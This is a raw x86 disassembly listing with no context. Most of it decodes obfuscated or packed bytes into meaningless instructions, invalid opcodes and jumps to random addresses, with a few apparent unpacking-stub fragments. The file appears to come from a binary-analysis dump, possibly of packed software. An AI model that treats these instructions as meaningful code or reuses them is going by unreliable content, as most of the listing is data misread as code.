  401903:	fisttp WORD PTR [esi+edi*1+0x8]
  401907:	mov    eax,gs
  401909:	fist   WORD PTR [ecx]
  40190b:	test   al,0x77
  40190d:	retf   0x44a2
  401910:	dec    edi
  401911:	and    bh,BYTE PTR [ecx+0x2b]
  401914:	leave  
  401915:	mov    ebp,0x5a5e0964
  40191a:	mov    edi,0xe47b117d
  40191f:	outs   dx,DWORD PTR ds:[esi]
  401920:	shr    BYTE PTR [esi],cl
  401922:	mov    ebp,0x6682e2a0
  401927:	sub    eax,0x3f8052c5
  40192c:	(bad)  
  40192d:	xchg   ebp,eax
  40192e:	xchg   cl,al
  401930:	popa   
  401931:	fcom   QWORD PTR [ecx+0x54]
  401934:	mov    ch,0xfd
  401936:	and    al,0x32
  401938:	push   ds
  401939:	(bad)  
  40193a:	popf   
  40193b:	or     edi,ebx
  40193d:	mov    dh,0x2a
  40193f:	mov    ah,0xe
  401941:	shl    DWORD PTR [edi+0x1b4e91f4],0xdc
  401948:	in     eax,0xd1
  40194a:	enter  0x1acc,0x6
  40194e:	pop    esp
  40194f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401950:	out    0x9a,al
  401952:	push   esp
  401953:	outs   dx,DWORD PTR ds:[esi]
  401954:	mov    WORD PTR [edi],ss
  401956:	(bad)  
  401957:	push   ebp
  401958:	mov    cl,0x63
  40195a:	frstor [ecx]
  40195c:	xor    al,0xaa
  40195e:	jb     0x401984
  401960:	and    al,0x86
  401962:	mov    ebx,0xf6acb72
  401967:	loopne 0x4019b4
  401969:	inc    edx
  40196a:	mov    al,ds:0xdf3974a5
  40196f:	adc    al,0x29
  401971:	aam    0x27
  401973:	jne    0x4019e1
  401975:	loop   0x401903
  401977:	addr16 (bad) 
  401979:	(bad)  
  40197a:	jmp    0x401914
  40197c:	push   cs
  40197d:	mov    si,0xf50e
  401981:	mov    esi,0x5f18986a
  401986:	lahf   
  401987:	and    BYTE PTR [ebx+eiz*8-0x6753bb79],0x9a
  40198f:	in     eax,dx
  401990:	neg    DWORD PTR [ebx+esi*8+0x5e]
  401994:	sub    eax,0xac39d6fb
  401999:	xlat   BYTE PTR ds:[ebx]
  40199a:	cmp    eax,0x97fdf102
  40199f:	sbb    al,0x2
  4019a1:	jo     0x40194f
  4019a3:	inc    esp
  4019a4:	mov    esp,0xb21ff71b
  4019a9:	sbb    al,0x38
  4019ab:	imul   ebp,edi,0x28
  4019ae:	les    esi,FWORD PTR [ebx]
  4019b0:	ret    0x7d3d
  4019b3:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  4019ba:	add    BYTE PTR [eax],al
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	and    al,0x22
  401a1b:	or     cl,BYTE PTR [edx+0x70707ba4]
  401a21:	xchg   edi,eax
  401a22:	jge    0x401a94
  401a24:	jo     0x401a97
  401a26:	pop    edi
  401a27:	repnz sbb al,0xd2
  401a2a:	leave  
  401a2b:	in     eax,0xa4
  401a2d:	mov    ebp,DWORD PTR es:[edi+0xc]
  401a31:	push   ebx
  401a32:	int    0xff
  401a34:	dec    ebx
  401a35:	sub    BYTE PTR [ebx+0x14],dh
  401a38:	pop    ecx
  401a39:	sub    al,0x2c
  401a3b:	and    DWORD PTR [edi+0x34575204],ebp
  401a41:	pusha  
  401a42:	xchg   ebp,eax
  401a43:	jg     0x401ac2
  401a45:	mov    ah,0x7f
  401a47:	ins    BYTE PTR es:[edi],dx
  401a48:	out    0x79,al
  401a4a:	mov    edi,0x124867ee
  401a4f:	adc    DWORD PTR [ecx],esp
  401a51:	mov    ebx,DWORD PTR [ecx]
  401a53:	jns    0x401a21
  401a55:	mov    ch,0x99
  401a57:	xchg   ebx,eax
  401a58:	cld    
  401a59:	sub    al,0x6a
  401a5b:	xor    al,0x14
  401a5d:	sub    bl,BYTE PTR [ecx+0x365080cc]
  401a63:	outs   dx,BYTE PTR ds:[esi]
  401a64:	imul   ebp,DWORD PTR [edi+0x445ea732],0x47e2bd6a
  401a6e:	popa   
  401a6f:	cmp    ebp,eax
  401a71:	xchg   edx,eax
  401a72:	and    DWORD PTR [edi],esi
  401a74:	jnp    0x401ae5
  401a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a77:	loopne 0x401a18
  401a79:	mov    edx,DWORD PTR [ecx+0x1525dca6]
  401a7f:	adc    bl,BYTE PTR [ebp+eax*8-0x2b0e427f]
  401a86:	pop    ds
  401a87:	test   dh,dh
  401a89:	lods   eax,DWORD PTR ds:[esi]
  401a8a:	jbe    0x401a20
  401a8c:	push   esp
  401a8d:	fwait
  401a8e:	jle    0x401a9a
  401a90:	fnop   
  401a92:	xchg   esi,eax
  401a93:	jg     0x401a50
  401a95:	or     eax,0x39d52560
  401a9a:	inc    cx
  401a9c:	xor    DWORD PTR [ebx+0x6b644cd7],0xf8298861
  401aa6:	pop    ebp
  401aa7:	int    0x3a
  401aa9:	and    eax,0xf4c1ab20
  401aae:	lock inc ebx
  401ab0:	mov    ds:0x43971cd3,eax
  401ab5:	call   0x464ca925
  401aba:	pop    esp
  401abb:	clc    
  401abc:	shr    DWORD PTR [edx-0x7d0bac16],0x66
  401ac3:	dec    edi
  401ac4:	sbb    esp,DWORD PTR [esi+edi*2+0x2c]
  401ac8:	xchg   ebx,eax
  401ac9:	aam    0x2d
  401acb:	pop    ebp
  401acc:	push   edx
  401acd:	xchg   BYTE PTR [ebp+ebx*2+0x5ce0c334],ah
  401ad4:	test   DWORD PTR [ebx+0x30],edx
  401ad7:	sti    
  401ad8:	jae    0x401ae3
  401ada:	jbe    0x401b34
  401adc:	or     BYTE PTR ds:0xb06ce654,ah
  401ae2:	js     0x401ac6
  401ae4:	inc    eax
  401ae5:	xlat   BYTE PTR ds:[ebx]
  401ae6:	in     al,0x78
  401ae8:	and    DWORD PTR [eax-0x58],esp
  401aeb:	inc    edx
  401aec:	cmc    
  401aed:	jg     0x401acf
  401aef:	(bad)  
  401af0:	lahf   
  401af1:	inc    edx
  401af2:	lea    ebp,[ebx+0x21]
  401af5:	or     BYTE PTR [edi-0x68],al
  401af8:	mov    esp,0x7c283cf7
  401afd:	in     eax,0x3c
  401aff:	out    0x3d,al
  401b01:	(bad)  
  401b02:	or     BYTE PTR [ebx+0x47],cl
  401b05:	gs int3 
  401b07:	scas   al,BYTE PTR es:[edi]
  401b08:	jmp    0xbf2709a
  401b0d:	adc    DWORD PTR [eax-0x4738b14c],0x71
  401b14:	cmp    al,dh
  401b16:	aam    0x7e
  401b18:	nop
  401b19:	fs sbb eax,0xd5527838
  401b1f:	sub    al,0x5d
  401b21:	hlt    
  401b22:	xchg   esi,eax
  401b23:	fnstsw WORD PTR [ebx]
  401b25:	push   edx
  401b26:	pop    edx
  401b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b28:	pop    ecx
  401b29:	jmp    DWORD PTR [edi+ebp*2]
  401b2c:	stos   DWORD PTR es:[edi],eax
  401b2d:	mov    ch,0xc0
  401b2f:	mov    ecx,0x83c67f9a
  401b34:	les    ecx,FWORD PTR [edi+0x705c7bba]
  401b3a:	rcr    DWORD PTR [edi+0x48],cl
  401b3d:	push   esp
  401b3e:	in     al,0x80
  401b40:	imul   esp,ebp,0x97fd7fa9
  401b46:	xchg   esp,eax
  401b47:	stc    
  401b48:	sbb    cl,BYTE PTR [eax]
  401b4a:	fmul   DWORD PTR [edx]
  401b4c:	sbb    al,0x78
  401b4e:	adc    eax,DWORD PTR [edi]
  401b50:	test   DWORD PTR [ebp+0x77],eax
  401b53:	xor    eax,0x10e2503
  401b58:	mov    bl,0x82
  401b5a:	int3   
  401b5b:	jge    0x401b0a
  401b5d:	ret    0x21e9
  401b60:	sbb    BYTE PTR [ebp+ecx*2+0x30],ch
  401b64:	daa    
  401b65:	sub    esi,DWORD PTR [esi+edi*2+0x5a]
  401b69:	or     DWORD PTR [esi],edi
  401b6b:	push   0x25466a87
  401b70:	sbb    eax,0xe43f5fe9
  401b75:	repnz mov DWORD PTR [ecx+eax*8-0x2f38235f],0x75b5358e
  401b81:	add    ebp,0xffffff89
  401b84:	div    DWORD PTR [esi+0x5477da83]
  401b8a:	dec    edx
  401b8b:	cmp    eax,0x2f832a52
  401b90:	repnz jecxz 0x401bcd
  401b93:	mov    eax,ds:0x71154f5a
  401b98:	dec    ecx
  401b99:	xchg   ebp,eax
  401b9a:	push   cs
  401b9b:	dec    esi
  401b9c:	or     DWORD PTR [edx],ebp
  401b9e:	inc    eax
  401b9f:	mov    ds,WORD PTR [edi-0x13e3a579]
  401ba5:	shl    cl,1
  401ba7:	imul   edi,DWORD PTR [ecx-0x7a],0x13
  401bab:	sub    al,0xe1
  401bad:	cmp    eax,0x82ddd4cb
  401bb2:	xor    al,0xa9
  401bb4:	jmp    0xfd1a40f2
  401bb9:	xor    esi,DWORD PTR [ebp-0x75]
  401bbc:	jae    0x401bc3
  401bbe:	retf   0xfec3
  401bc1:	cmp    edx,DWORD PTR [ecx+0x6c2fc6c7]
  401bc7:	dec    ebx
  401bc8:	std    
  401bc9:	jno    0x401b6c
  401bcb:	cmp    ecx,DWORD PTR [edi-0x61]
  401bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bcf:	xor    edx,edx
  401bd1:	mov    ah,0xd0
  401bd3:	jnp    0x401c29
  401bd5:	(bad)  [esi+0x1662bd83]
  401bdb:	sti    
  401bdc:	adc    eax,ecx
  401bde:	add    BYTE PTR [esi],al
  401be0:	dec    ebp
  401be1:	sub    DWORD PTR [ebx],ecx
  401be3:	push   esp
  401be4:	mov    ds:0x61de092a,eax
  401be9:	jb     0x401b87
  401beb:	dec    esp
  401bec:	pop    ebp
  401bed:	test   al,0x6e
  401bef:	mov    eax,0x6d3432af
  401bf4:	shl    DWORD PTR [edx-0x7e82c01e],0xeb
  401bfb:	or     DWORD PTR [edi+0x662c69d],esp
  401c01:	xchg   DWORD PTR [ecx+0x5f],eax
  401c04:	out    0xb0,al
  401c06:	stos   BYTE PTR es:[edi],al
  401c07:	adc    cl,al
  401c09:	mov    ds:0xe0e9a285,al
  401c0e:	xchg   edi,eax
  401c0f:	xor    al,0xbe
  401c11:	hlt    
  401c12:	jl     0x401c04
  401c14:	mov    ebx,0x720d393d
  401c19:	adc    DWORD PTR [ebp+0x25],esp
  401c1c:	scas   eax,DWORD PTR es:[edi]
  401c1d:	and    eax,0x2c6e738d
  401c22:	pop    es
  401c23:	or     bh,bl
  401c25:	and    dh,BYTE PTR [esi+0x30]
  401c28:	and    ch,BYTE PTR [edi]
  401c2a:	enter  0x75ca,0xe4
  401c2e:	and    bh,ch
  401c30:	pushf  
  401c31:	loope  0x401c8f
  401c33:	out    dx,al
  401c34:	aaa    
  401c35:	call   0x93bc:0x5a81619d
  401c3c:	je     0x401c49
  401c3e:	mov    dh,0x97
  401c40:	jo     0x401c97
  401c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c43:	dec    esp
  401c44:	js     0x401c09
  401c46:	pop    edx
  401c47:	xchg   esp,eax
  401c48:	jge    0x401c0c
  401c4a:	inc    ebx
  401c4b:	or     al,0xac
  401c4d:	in     eax,dx
  401c4e:	lahf   
  401c4f:	mov    BYTE PTR [edi+0x70],bl
  401c52:	mov    dl,0x4b
  401c54:	adc    eax,0x8f9fc85d
  401c59:	sti    
  401c5a:	fmul   st(3),st
  401c5c:	sub    al,0x31
  401c5e:	mov    ah,0x48
  401c60:	mov    ds:0x4cdd3c36,al
  401c65:	or     BYTE PTR [esp+eiz*2],bh
  401c68:	not    DWORD PTR [edx-0x29133589]
  401c6e:	mov    esp,0x9ced8402
  401c73:	jns    0x401c5b
  401c75:	xchg   DWORD PTR [ebx+0x242be6f],eax
  401c7b:	popa   
  401c7c:	push   esp
  401c7d:	div    BYTE PTR cs:[eax+0x3b]
  401c81:	scas   al,BYTE PTR es:[edi]
  401c82:	jb     0x401cb5
  401c84:	adc    BYTE PTR [ebx-0x623a269],cl
  401c8a:	aad    0x43
  401c8c:	fild   DWORD PTR [esp+esi*1]
  401c8f:	xchg   ebp,eax
  401c90:	push   es
  401c91:	lds    ecx,FWORD PTR [esi]
  401c93:	mov    al,ds:0xe4ed4012
  401c98:	lods   eax,DWORD PTR ds:[esi]
  401c99:	ret    0x5f77
  401c9c:	adc    dl,ah
  401c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c9f:	jge    0x401cd5
  401ca1:	jecxz  0x401cae
  401ca3:	mov    edi,0xf8b54db
  401ca8:	add    BYTE PTR [ebx],cl
  401caa:	xor    BYTE PTR [esi+edi*8+0x21b4c97f],0x2
  401cb2:	popa   
  401cb3:	imul   edi,ecx,0x4e1cf4b7
  401cb9:	cwde   
  401cba:	sti    
  401cbb:	sub    eax,edx
  401cbd:	and    al,0x89
  401cbf:	hlt    
  401cc0:	in     eax,0x32
  401cc2:	jge    0x401c81
  401cc4:	mov    edi,0x8dda0b22
  401cc9:	and    al,0x39
  401ccb:	and    al,0x7e
  401ccd:	or     dh,BYTE PTR [edi]
  401ccf:	ins    DWORD PTR es:[edi],dx
  401cd0:	mov    ds:0xfe21eecf,al
  401cd5:	adc    eax,0x9aa95aa4
  401cda:	mov    ecx,0x6a3f9fc6
  401cdf:	jg     0x401c95
  401ce1:	jg     0x401d32
  401ce3:	mov    ch,0xe2
  401ce5:	stos   DWORD PTR es:[edi],eax
  401ce6:	and    ecx,DWORD PTR ds:0x16c7dcc1
  401cec:	test   DWORD PTR [ebx-0x14],0xc3eafc87
  401cf3:	popa   
  401cf4:	cli    
  401cf5:	(bad)  
  401cf6:	in     eax,dx
  401cf7:	scas   eax,DWORD PTR es:[edi]
  401cf8:	cmc    
  401cf9:	stos   BYTE PTR es:[edi],al
  401cfa:	js     0x401d57
  401cfc:	dec    ecx
  401cfd:	lahf   
  401cfe:	das    
  401cff:	or     al,0xcd
  401d01:	inc    ebx
  401d02:	cmp    eax,0x37ae3b13
  401d07:	jne    0x401d5c
  401d09:	mul    BYTE PTR [ecx]
  401d0b:	test   al,0xcf
  401d0d:	adc    BYTE PTR [edx+eax*4],dl
  401d10:	sbb    edx,DWORD PTR [edx]
  401d12:	inc    ebp
  401d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d14:	mov    eax,0x1b983f71
  401d19:	jmp    0x4796:0x1454f834
  401d20:	xchg   ah,ch
  401d22:	lds    edx,FWORD PTR [edi+0x19cd6071]
  401d28:	repnz sub eax,0x1cff9f51
  401d2e:	or     eax,0xc1cfc44
  401d33:	jo     0x401cff
  401d35:	dec    ebp
  401d36:	xor    eax,0x88b3cf54
  401d3b:	mov    dl,0x94
  401d3d:	jbe    0x401d7a
  401d3f:	fmul   DWORD PTR [esi]
  401d41:	sbb    DWORD PTR [edx+0x5e80ce],0x28
  401d48:	adc    edi,ecx
  401d4a:	mov    ah,0xe9
  401d4c:	dec    ebp
  401d4d:	arpl   cx,ax
  401d4f:	inc    esp
  401d50:	scas   eax,DWORD PTR es:[edi]
  401d51:	ror    bl,cl
  401d53:	adc    ch,BYTE PTR [edi-0x2b005147]
  401d59:	and    DWORD PTR [edi+0x1865c6ce],ecx
  401d5f:	les    ebp,FWORD PTR [eax+0x3874984]
  401d65:	add    BYTE PTR [ecx+eax*2],0x8e
  401d69:	and    al,ah
  401d6b:	lods   al,BYTE PTR ds:[esi]
  401d6c:	mov    edx,0xe22ed87f
  401d71:	jmp    0x4cea2619
  401d76:	inc    esp
  401d77:	add    cl,BYTE PTR [ecx+eax*8-0x75]
  401d7b:	test   ebp,0x4b9793b0
  401d81:	out    dx,eax
  401d82:	pop    esp
  401d83:	or     cl,BYTE PTR ss:[edi-0x66849309]
  401d8a:	pop    esi
  401d8b:	scas   al,BYTE PTR es:[edi]
  401d8c:	fsubr  QWORD PTR [eax-0x71]
  401d8f:	and    eax,DWORD PTR [eax]
  401d91:	loopne 0x401d1d
  401d93:	mov    bl,ch
  401d95:	lods   eax,DWORD PTR ds:[esi]
  401d96:	adc    al,0x7c
  401d98:	gs test eax,0x8a445169
  401d9e:	loopne 0x401de9
  401da0:	stos   DWORD PTR es:[edi],eax
  401da1:	(bad)  
  401da2:	cmp    al,0x97
  401da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401da5:	ss repnz imul edi,ebx,0xfffffffa
  401daa:	fsubr  DWORD PTR [esi+0x3053f4a5]
  401db0:	sahf   
  401db1:	mov    esi,DWORD PTR [ebx]
  401db3:	(bad)  
  401db4:	rol    BYTE PTR [esi+0x3d],1
  401db7:	cwde   
  401db8:	cwde   
  401db9:	pop    ds
  401dba:	imul   ebp,DWORD PTR [edx+eax*1-0x11],0x1d315151
  401dc2:	out    0x43,al
  401dc4:	inc    ebx
  401dc5:	add    BYTE PTR [eax-0x7637acf],bh
  401dcb:	sub    DWORD PTR ds:0x432e5e,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432e4e,0x4343ee
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	inc    esp
  401df0:	mov    ds:0x73be2d8,eax
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401df1
  401dfc:	inc    ebp
  401dfd:	jnp    0x401da3
  401dff:	mov    ah,0xdd
  401e01:	cdq    
  401e02:	cmp    al,0xd
  401e04:	aam    0xa0
  401e06:	lods   al,BYTE PTR ds:[esi]
  401e07:	mov    eax,ds:0x9186c8c6
  401e0c:	cmp    BYTE PTR ds:0xd3f29697,bl
  401e12:	xor    al,BYTE PTR [ebx+0x7b]
  401e15:	fldcw  WORD PTR [esi+0x6f]
  401e18:	inc    DWORD PTR [ebp+0x218dd604]
  401e1e:	cmp    bl,ah
  401e20:	in     eax,dx
  401e21:	pushf  
  401e22:	icebp  
  401e23:	xor    edi,DWORD PTR [eax]
  401e25:	or     eax,0x11664de8
  401e2a:	sti    
  401e2b:	mov    bl,0xe3
  401e2d:	fild   DWORD PTR [edx+0x3369f061]
  401e33:	outs   dx,BYTE PTR ds:[esi]
  401e34:	xchg   esp,eax
  401e35:	int3   
  401e36:	mov    BYTE PTR [edi-0x54cdae28],dh
  401e3c:	jmp    0x4725f1ee
  401e41:	pop    ebp
  401e42:	jecxz  0x401e15
  401e44:	frstpm(287 only) 
  401e46:	aam    0xa9
  401e48:	int3   
  401e49:	and    DWORD PTR ds:0x8eafa04a,ebp
  401e4f:	lock jmp 0x326f2b30
  401e55:	jo     0x401eb8
  401e57:	sbb    BYTE PTR [ecx+0x34],bl
  401e5a:	cld    
  401e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e5c:	mov    eax,0x33e34e64
  401e61:	stos   DWORD PTR es:[edi],eax
  401e62:	cmp    BYTE PTR [esi-0x6d6891ef],cl
  401e68:	push   esp
  401e69:	jge    0x401e7b
  401e6b:	xor    eax,0xc7b55832
  401e70:	loop   0x401e02
  401e72:	and    eax,0x235fdbc5
  401e77:	or     bl,BYTE PTR [esi+ecx*8+0x63]
  401e7b:	nop
  401e7c:	pop    ebp
  401e7d:	jl     0x401ed4
  401e7f:	adc    eax,0xd0de059d
  401e84:	pop    ss
  401e85:	and    al,0x42
  401e87:	sbb    al,0xcf
  401e89:	jmp    0xe3eb:0x7f252c8f
  401e90:	arpl   WORD PTR [ebx-0xa],bp
  401e93:	in     eax,dx
  401e94:	and    bl,bh
  401e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e97:	clc    
  401e98:	das    
  401e99:	(bad)  
  401e9a:	push   0x8c205b7b
  401e9f:	xchg   edi,eax
  401ea0:	retf   
  401ea1:	cmp    al,0x25
  401ea3:	inc    edi
  401ea4:	es ffree st(7)
  401ea7:	add    BYTE PTR [edi+0x30],cl
  401eaa:	sub    ebp,DWORD PTR [edi]
  401eac:	loop   0x401ef5
  401eae:	sub    al,BYTE PTR [edx-0x54]
  401eb1:	mov    edi,DWORD PTR [edi+0x57]
  401eb4:	push   eax
  401eb5:	and    DWORD PTR [ecx-0x40ee8b89],ecx
  401ebb:	mov    eax,DWORD PTR [edx-0x7a99faf5]
  401ec1:	(bad)  
  401ec2:	jge    0x401e6f
  401ec4:	je     0x401e89
  401ec6:	mov    ebp,0x664a96f2
  401ecb:	pusha  
  401ecc:	dec    ebp
  401ecd:	cmc    
  401ece:	mov    edx,DWORD PTR [esp+eax*1-0x33ecfe4c]
  401ed5:	mov    ebx,0xa450672d
  401eda:	hlt    
  401edb:	mov    dl,0xb5
  401edd:	dec    ebp
  401ede:	dec    eax
  401edf:	push   ecx
  401ee0:	dec    esi
  401ee1:	loop   0x401f3e
  401ee3:	adc    eax,0x50cd12bf
  401ee8:	add    al,0xe8
  401eea:	popf   
  401eeb:	sbb    BYTE PTR [ebx],dh
  401eed:	repz pushf 
  401eef:	loop   0x401f5a
  401ef1:	scas   al,BYTE PTR es:[edi]
  401ef2:	out    0x55,al
  401ef4:	jge    0x401ee3
  401ef6:	pop    ecx
  401ef7:	out    0xb1,al
  401ef9:	pusha  
  401efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401efb:	mov    al,ds:0xc3c34171
  401f00:	sbb    eax,0x614c78df
  401f05:	pop    edx
  401f06:	faddp  st(3),st
  401f08:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f0a:	sbb    al,bh
  401f0c:	cli    
  401f0d:	leave  
  401f0e:	and    al,0xff
  401f10:	xchg   edi,eax
  401f11:	lock das 
  401f13:	fucomi st,st(6)
  401f15:	std    
  401f16:	sub    esp,ebx
  401f18:	pop    es
  401f19:	push   edx
  401f1a:	in     al,0x14
  401f1c:	xchg   ebp,eax
  401f1d:	pop    ebx
  401f1e:	pop    esp
  401f1f:	xchg   ecx,eax
  401f20:	jnp    0x401f80
  401f22:	or     esi,ebp
  401f24:	iret   
  401f25:	dec    ebp
  401f26:	test   DWORD PTR [esi-0xb],eax
  401f29:	sub    eax,0x84eebfd3
  401f2e:	xchg   al,ch
  401f30:	neg    DWORD PTR [edx]
  401f32:	adc    eax,0xa46d20de
  401f37:	repnz pop edi
  401f39:	mov    ds:0x6e607fd,eax
  401f3e:	dec    eax
  401f3f:	(bad)  
  401f40:	jmp    0x401ed1
  401f42:	mov    edx,DWORD PTR [edi-0x21]
  401f45:	mov    bh,0x4
  401f47:	enter  0x7588,0x8
  401f4b:	xor    al,dl
  401f4d:	jnp    0x401f1c
  401f4f:	lea    esp,[edx+0x3e]
  401f52:	fild   QWORD PTR [edx]
  401f54:	xlat   BYTE PTR ds:[ebx]
  401f55:	inc    edi
  401f56:	iret   
  401f57:	ror    BYTE PTR [esi-0x527af61a],1
  401f5d:	js     0x401fdc
  401f5f:	or     eax,0x397e3d0a
  401f64:	loop   0x401fca
  401f66:	dec    ebx
  401f67:	fdiv   st,st(4)
  401f69:	les    ebp,FWORD PTR [esi]
  401f6b:	enter  0xab40,0xe
  401f6f:	sbb    ebx,DWORD PTR [ebx]
  401f71:	push   eax
  401f72:	(bad)  
  401f73:	repz setnp cl
  401f77:	sub    ebp,ebp
  401f79:	imul   ecx,DWORD PTR [ebp+0x53],0xffffffe7
  401f7d:	inc    eax
  401f7e:	ss inc edx
  401f80:	dec    ebx
  401f81:	jb     0x401f25
  401f83:	fs jmp 0xf660:0x9d2fb455
  401f8b:	ss int 0xca
  401f8e:	clc    
  401f8f:	pushf  
  401f90:	or     al,0x20
  401f92:	js     0x401f76
  401f94:	mov    bl,0xb9
  401f96:	and    eax,0x1a4b77bc
  401f9b:	xor    eax,0x31a207d1
  401fa0:	retf   0xfc3a
  401fa3:	arpl   WORD PTR [ecx],si
  401fa5:	push   ds
  401fa6:	cmc    
  401fa7:	dec    ah
  401fa9:	mov    ah,0x9c
  401fab:	mov    WORD PTR [edx],?
  401fad:	xor    edx,DWORD PTR [esi-0x41]
  401fb0:	pop    esi
  401fb1:	aam    0xe3
  401fb3:	ret    
  401fb4:	xor    ah,dl
  401fb6:	mov    ebp,0x893743ce
  401fbb:	mov    dl,0x86
  401fbd:	or     edi,DWORD PTR [edi+0xcc3fa78]
  401fc3:	cmp    esp,ebx
  401fc5:	enter  0x3a00,0xd5
  401fc9:	fxch   st(0)
  401fcb:	enter  0xd94e,0xca
  401fcf:	in     al,0x77
  401fd1:	es push edx
  401fd3:	adc    eax,0x324280b1
  401fd8:	test   al,0x7a
  401fda:	or     BYTE PTR [esp+edi*8-0x4f],ch
  401fde:	and    al,0xcb
  401fe0:	cli    
  401fe1:	lods   eax,DWORD PTR ds:[esi]
  401fe2:	xchg   edx,eax
  401fe3:	hlt    
  401fe4:	out    0x4,al
  401fe6:	push   0x61
  401fe8:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401fea:	sbb    ch,BYTE PTR [esp+ebx*2+0x533bb0c0]
  401ff1:	dec    esi
  401ff2:	mov    al,0xa4
  401ff4:	dec    eax
  401ff5:	repnz sbb BYTE PTR [eax],ch
  401ff8:	mov    ebp,0xdff1d663
  401ffd:	xor    ebx,ebx
  401fff:	int3   
  402000:	mov    edx,0xf907abd8
  402005:	loop   0x401f87
  402007:	aam    0xcf
  402009:	jp     0x401fda
  40200b:	(bad)  
  40200c:	fsubr  st,st(1)
  40200e:	xchg   ecx,eax
  40200f:	and    eax,0x768474be
  402014:	fidiv  DWORD PTR [ebx-0x4058e029]
  40201a:	hlt    
  40201b:	sbb    BYTE PTR [esi],dl
  40201d:	mov    ch,0x6f
  40201f:	cdq    
  402020:	cmp    edi,0xffffffd4
  402023:	popa   
  402024:	pop    esp
  402025:	stos   BYTE PTR es:[edi],al
  402026:	mov    eax,0x8f9a3ce1
  40202b:	cld    
  40202c:	mov    cl,0x4e
  40202e:	jno    0x402046
  402030:	outs   dx,BYTE PTR ds:[esi]
  402031:	mov    dl,0x41
  402033:	sahf   
  402034:	add    DWORD PTR [ecx+0x5d],ebx
  402037:	jg     0x40202b
  402039:	neg    BYTE PTR [edx+0x1da1521a]
  40203f:	cmc    
  402040:	add    dl,bl
  402042:	ja     0x401feb
  402044:	std    
  402045:	or     bl,bh
  402047:	call   0xd115b79e
  40204c:	iret   
  40204d:	sbb    edx,esp
  40204f:	push   0x49
  402051:	imul   edi,eax,0xd7cf7988
  402057:	repnz sbb edx,0xcc6c73a5
  40205e:	or     dl,BYTE PTR [esi-0x368da7bb]
  402064:	setb   BYTE PTR [edx]
  402067:	pop    esi
  402068:	inc    ecx
  402069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40206a:	daa    
  40206b:	push   eax
  40206c:	sbb    edi,DWORD PTR [ecx+ebx*1]
  40206f:	aad    0xa4
  402071:	mov    bh,0x63
  402073:	or     eax,0x33dd6055
  402078:	adc    al,0x51
  40207a:	jmp    0x4127fc5d
  40207f:	out    0x9,al
  402081:	inc    esi
  402082:	push   esi
  402083:	pop    ebx
  402084:	test   BYTE PTR [esi+0x15158990],dh
  40208a:	fs push edx
  40208c:	(bad)  
  40208e:	ins    BYTE PTR es:[edi],dx
  40208f:	jl     0x402098
  402091:	std    
  402092:	xchg   ebp,eax
  402093:	add    BYTE PTR [ecx-0x11],dl
  402096:	mov    gs,WORD PTR [esi-0x484532cc]
  40209c:	fistp  WORD PTR [eax-0x69]
  40209f:	push   eax
  4020a0:	or     eax,0x4cc376cf
  4020a5:	cdq    
  4020a6:	pushf  
  4020a7:	in     eax,0xe2
  4020a9:	scas   eax,DWORD PTR es:[edi]
  4020aa:	paddd  mm6,mm7
  4020ad:	out    dx,al
  4020ae:	adc    BYTE PTR [ebx-0x5344e1b4],ch
  4020b4:	test   eax,0xcd68deed
  4020b9:	push   ds
  4020ba:	sbb    DWORD PTR [edx-0x33cdf9cf],edi
  4020c0:	mov    esi,0x773d1aed
  4020c5:	adc    BYTE PTR [eax+0x3d],0x7b
  4020c9:	adc    al,0xd
  4020cb:	mov    eax,0x8ad3a0ca
  4020d0:	adc    BYTE PTR [ecx],cl
  4020d2:	push   ebp
  4020d3:	loop   0x40211a
  4020d5:	popf   
  4020d6:	mov    bl,0xba
  4020d8:	mov    DWORD PTR [esp+ebp*1-0x52],ecx
  4020dc:	test   eax,0xff3e6f49
  4020e1:	push   edx
  4020e2:	xor    BYTE PTR [esi+eax*8+0x6a],al
  4020e6:	out    dx,al
  4020e7:	xor    ah,BYTE PTR [ebp-0x58802438]
  4020ed:	jmp    DWORD PTR [ebx-0xa]
